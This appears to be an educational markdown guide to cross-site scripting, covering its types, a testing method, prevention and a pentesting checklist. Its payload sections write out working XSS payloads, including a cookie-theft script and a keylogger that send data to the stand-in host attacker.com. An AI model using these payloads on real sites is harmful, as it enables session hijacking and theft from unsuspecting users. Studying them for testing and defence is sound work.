# Cross-Site Scripting (XSS)

## Overview

Cross-Site Scripting (XSS) is a client-side injection vulnerability where an attacker injects malicious JavaScript into a trusted web application.

When another user visits the vulnerable page, the browser executes the attacker's JavaScript with the same privileges as the legitimate website.

OWASP Top 10 (2025)

- A03: Injection
- Client-Side Code Injection

---

# What is XSS?

Normally:

```
User Input
     │
     ▼
Server
     │
Escapes Input
     │
     ▼
Browser displays text
```

Vulnerable Application

```
User Input
      │
      ▼
Server
      │
Returns raw HTML
      │
      ▼
Browser executes JavaScript
```

Instead of displaying text, the browser executes it as code.

---

# Why XSS Works

The browser cannot distinguish between:

- Legitimate JavaScript
- Malicious JavaScript

If user-controlled input reaches the page without proper output encoding, the browser treats it as part of the webpage.

---

# Important Terminologies

## DOM (Document Object Model)

The browser's in-memory representation of a webpage.

JavaScript interacts with the DOM to:

- Read content
- Modify elements
- Add HTML
- Remove elements

Example

```javascript
document.getElementById("msg").innerHTML = "Hello";
```

---

## URL Parameters

User-controlled data after `?`

Example

```
https://example.com/search?q=laptop
```

Parameter

```
q=laptop
```

Attackers often inject payloads through URL parameters.

---

## JavaScript

Programming language executed inside browsers.

Used by XSS payloads to:

- Read page contents
- Modify DOM
- Send requests
- Steal cookies
- Perform actions

---

## Cookies

Store:

- Session IDs
- Preferences
- Authentication

Example

```
PHPSESSID=abc123
```

If JavaScript can access cookies:

```
document.cookie
```

An attacker may steal the session.

---

## HttpOnly

HttpOnly cookies cannot be read using JavaScript.

Good:

```
Set-Cookie:
HttpOnly
```

Prevents:

```
document.cookie
```

---

## Escaping

Converts dangerous characters into harmless text.

Instead of

```
<script>
```

Browser receives

```
&lt;script&gt;
```

Nothing executes.

---

# What is an XSS Payload?

A payload is the JavaScript an attacker injects.

Simple Proof of Concept

```html
<script>alert('XSS')</script>
```

If alert appears:

Application is vulnerable.

---

# Payload Structure

Every payload contains two parts.

## Intention

What attacker wants.

Examples

- Alert
- Cookie Theft
- Keylogging
- Account Takeover

## Modification

Payload changes depending on where input appears.

Examples

Inside

- HTML
- Attribute
- JavaScript
- URL
- DOM

---

# Common Injection Points

- Search Boxes
- Comments
- User Profiles
- Feedback Forms
- Contact Forms
- URL Parameters
- Chat Applications
- Admin Panels

---

# Common XSS Payloads

## Proof of Concept

```html
<script>alert('XSS')</script>
```

---

## Cookie Theft

```html
<script>

fetch(
'https://attacker.com/?cookie='
+btoa(document.cookie)
)

</script>
```

---

## Keylogger

```javascript
document.onkeypress=function(e){

fetch(
'https://attacker.com/?key='
+btoa(e.key)
)

}
```

---

## Business Logic

```javascript
user.changeEmail(
"attacker@evil.com"
)
```

---

# Types of XSS

1. Reflected XSS
2. Stored XSS
3. DOM-Based XSS
4. Blind XSS

---

# Reflected XSS

## Definition

User input is immediately reflected in the response.

Nothing is stored.

Victim must click the malicious link.

---

## Flow

Attacker

↓

Crafts malicious URL

↓

Victim clicks

↓

Application reflects payload

↓

Browser executes script

---

## Example

```
/search?q=<script>alert(1)</script>
```

Page prints

```
You searched for:

<script>alert(1)</script>
```

Browser executes.

---

## Common Locations

- Search
- Login Errors
- URL Parameters
- Error Pages

---

## Root Cause

Rendering untrusted input without escaping.

---

# Stored XSS

## Definition

Payload is permanently stored.

Database

↓

Another user visits

↓

Payload executes

---

## Flow

Attacker

↓

Submits comment

↓

Stored in Database

↓

Victim visits page

↓

JavaScript executes

---

## Common Locations

- Comments
- Forums
- Reviews
- User Profiles
- Chat Messages

---

## Example

Comment

```html
<script>alert(1)</script>
```

Every visitor executes it.

---

## Why Stored XSS Is Dangerous

Single payload

↓

Many victims

↓

Admins

↓

Persistent compromise

---

# DOM-Based XSS

## Definition

No server involvement.

JavaScript reads attacker-controlled input and writes it into the DOM using unsafe functions.

---

## Common Sources

- location.search
- location.hash
- document.URL
- document.referrer
- localStorage

---

## Dangerous Sinks

```
innerHTML
```

```
document.write()
```

```
eval()
```

```
setTimeout(string)
```

```
setInterval(string)
```

---

## Example

```javascript
element.innerHTML=location.hash;
```

URL

```
#<img src=x onerror=alert(1)>
```

Browser executes.

---

## Safe Alternative

```javascript
textContent
```

instead of

```
innerHTML
```

---

# Blind XSS

## Definition

Payload executes later in another user's browser.

Usually:

Support Staff

Admin

Moderator

Developer

---

## Flow

Attacker submits payload

↓

Stored

↓

Admin opens page

↓

Payload executes

↓

Data sent to attacker

---

## Typical Targets

- Contact Forms
- Support Tickets
- Bug Reports
- Internal Notes
- CRM Systems

---

# Blind XSS Testing

Use callback payload.

Example

```javascript
fetch(
"https://attacker.com/?cookie="
+btoa(document.cookie)
)
```

If callback received

↓

Blind XSS confirmed.

---

# XSS Hunter

Popular Blind XSS Platform

Automatically captures

- Cookies
- URLs
- DOM
- Screenshots
- Page HTML

Useful during bug bounty engagements.

---

# Common Payloads

Basic

```html
<script>alert(1)</script>
```

Image

```html
<img src=x onerror=alert(1)>
```

SVG

```html
<svg onload=alert(1)>
```

Iframe

```html
<iframe src=javascript:alert(1)>
```

Textarea Escape

```html
</textarea><script>alert(1)</script>
```

---

# XSS Impact

- Cookie Theft
- Session Hijacking
- Keylogging
- Account Takeover
- CSRF via JavaScript
- Credential Theft
- Fake Login Forms
- Malware Delivery
- Admin Compromise
- Internal Pivoting

---

# Testing Methodology

## Step 1

Find user input.

---

## Step 2

Inject

```html
<script>alert(1)</script>
```

---

## Step 3

Observe response.

---

## Step 4

Determine context.

- HTML
- Attribute
- JavaScript
- URL
- DOM

---

## Step 5

Modify payload.

---

## Step 6

Test impact.

- Cookie
- DOM
- Account Actions

---

# Prevention

## 1. Output Encoding

Escape HTML.

```
<
```

↓

```
&lt;
```

---

## 2. Input Validation

Allow only expected characters.

Example

Only

- Letters
- Numbers

Reject unexpected input.

---

## 3. Use Safe DOM APIs

Instead of

```
innerHTML
```

Use

```
textContent
```

or

```
innerText
```

---

## 4. Content Security Policy (CSP)

Restrict JavaScript execution.

Example

```
Content-Security-Policy:
script-src 'self'
```

---

## 5. HttpOnly Cookies

Protect session cookies.

JavaScript cannot access

```
document.cookie
```

---

## 6. Secure Frameworks

Use automatic escaping provided by

- React
- Angular
- Vue
- Django
- Flask (Jinja2)
- Laravel

Avoid bypassing escaping.

---

# Pentesting Checklist

□ Identify all user inputs

□ Test URL parameters

□ Test forms

□ Test search

□ Test comments

□ Test profiles

□ Test file names

□ Test headers

□ Test DOM sources

□ Identify reflection context

□ Test Stored XSS

□ Test DOM XSS

□ Test Blind XSS

□ Check CSP

□ Check HttpOnly cookies

□ Verify output encoding

---

# Key Takeaways

- XSS allows attackers to execute JavaScript in another user's browser.
- Reflected XSS requires user interaction.
- Stored XSS persists and affects multiple users.
- DOM XSS happens entirely in the browser through unsafe DOM manipulation.
- Blind XSS executes later in privileged users' browsers.
- HttpOnly cookies reduce session theft risk.
- Output encoding and safe DOM APIs are the primary defenses.
